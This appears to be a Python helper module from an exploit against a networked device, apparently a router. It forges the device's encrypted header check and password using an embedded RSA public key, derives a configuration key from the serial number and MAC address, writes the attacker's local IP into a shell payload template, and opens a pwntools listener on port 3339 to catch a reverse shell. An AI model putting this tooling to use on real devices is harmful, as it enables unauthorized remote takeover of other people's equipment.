from hashlib import sha256
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
from Crypto.Cipher import AES
from base64 import b64decode,b64encode
from random import randint
from Crypto.Util.Padding import pad
import socket

def checkheader(form):
    check = str(sha256(form.encode()).hexdigest())
    pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
    keyDER = b64decode(pubkey)
    keyPub = RSA.importKey(keyDER)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    cipher_text = cipher.encrypt(check.encode())
    checkb64b = b64encode(cipher_text)
    checkb64 = checkb64b.decode()
    return(checkb64)

def randkeyiv():
    s = ''
    for i in range(16):
        s = s + str(randint(0,9))
    return s

def encodepass(passwd):
    key = randkeyiv()
    iv = randkeyiv()
    encodedata = "{}+{}".format(key,iv)
    pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
    keyDER = b64decode(pubkey)
    keyPub = RSA.importKey(keyDER)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    cipher_text = cipher.encrypt(encodedata.encode())
    encodeb = b64encode(cipher_text)
    encode = encodeb.decode()
    bkey = sha256(key.encode("utf8")).digest()
    biv = sha256(iv.encode("utf8")).digest()
    aes_cipher = AES.new(bkey, AES.MODE_CBC, biv[:16])
    passwdb = bytes(passwd,'utf8')
    while len(passwdb) % 16 != 0:
        passwdb += b'\x00'
    cipherpass = aes_cipher.encrypt(passwdb)
    cipherpassb64 = b64encode(cipherpass)
    return(encode,cipherpassb64)

def composekey(mac,serial):
    serialp = serial.split('CDD')
    firstpart = "CDD{}".format(serialp[1])
    macp = mac.split(':')
    secondpart = "{}{}{}{}{}{}".format(macp[5],macp[4],macp[3],macp[2],macp[1],macp[0])
    print("[Config Key]: {}{}".format(firstpart,secondpart))
    return("{}{}".format(firstpart,secondpart))

def getlanip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        print("[Getlanip]: Unable to retrieve local address")
    finally:
        s.close()
    print("[Getlanip]: Acquired local IP {}".format(IP))
    return IP

def prepare_payload(ip):
    skel = open("payload.skel","r")
    genpayload = open("payload.sh","w")
    for line in skel:
        a = line.replace("[PLACEHOLDER]",ip)
        genpayload.write(a)
    print("[Prepare_payload]: Payload ready")

def getshell():
    from pwn import listen
    l = listen(3339)
    line = l.recvline()
    if line == b'\n':
        pass
    else:
        print(line)
    l.interactive()